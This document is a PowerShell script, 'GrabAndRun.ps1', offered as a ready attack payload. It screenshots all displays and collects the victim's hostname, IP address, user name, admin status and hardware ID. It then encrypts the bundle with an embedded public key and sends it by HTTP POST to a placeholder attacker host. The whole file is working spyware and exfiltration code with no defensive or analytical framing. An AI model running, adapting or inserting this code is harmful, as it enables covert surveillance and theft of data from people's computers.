# ░▒▓ GrabAndRun.ps1 ▓▒░
#
# Takes screenshot, grabs some local information, encrypts using X.509 public key and sends everything over HTTP

Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screens = [Windows.Forms.Screen]::AllScreens
$top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
$left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
$width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
$bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
$screen = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
$graphics = [Drawing.Graphics]::FromImage($screen)
$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
$screenStream = New-Object System.IO.MemoryStream
$screen.save($screenStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$screenBytes = $screenStream.ToArray()
$screenStream.Flush()
$screenStream.Dispose()
$screenshot = [convert]::ToBase64String($screenBytes)
$graphics.Dispose()
$screen.Dispose()

$os = $((Get-WmiObject -class Win32_OperatingSystem).Caption)
$hostname = $env:Computername
$domain = $env:UserDomain
$user = "$env:USERNAME@$domain"
$hwid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
$ipv4 = (Test-Connection -ComputerName $Hostname -Count 1).IPV4Address.IPAddressToString
$arch = $env:PROCESSOR_ARCHITECTURE
$isadmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$report = $Hostname + "," + $Ipv4 + "," + $Arch + "," + $Username + "," + $IsAdmin + "," + $screenshot

$certString = "MIIF[...]B3Ms="

$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$cert.Import([System.Text.Encoding]::UTF8.GetBytes($certString))
$encrypted = $cert.PublicKey.Key.Encrypt([System.Text.Encoding]::UTF8.GetBytes($report), $false)
$encrypted = [System.Convert]::ToBase64String($encrypted)
$encrypted

Invoke-WebRequest -UseBasicParsing http://VAR_ATTACKER_HOST:443/ -ContentType "text/html" -Method POST -Body $encrypted
